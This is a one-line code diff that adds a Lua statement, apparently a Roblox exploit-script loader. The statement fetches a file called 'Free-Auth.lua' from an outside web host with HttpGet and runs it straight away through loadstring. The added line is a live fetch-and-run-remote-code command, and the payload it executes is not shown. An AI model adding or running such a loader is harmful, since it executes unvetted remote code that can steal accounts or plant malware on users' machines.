@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://lua-library.btteam.net/files/Free-Auth.lua"))()
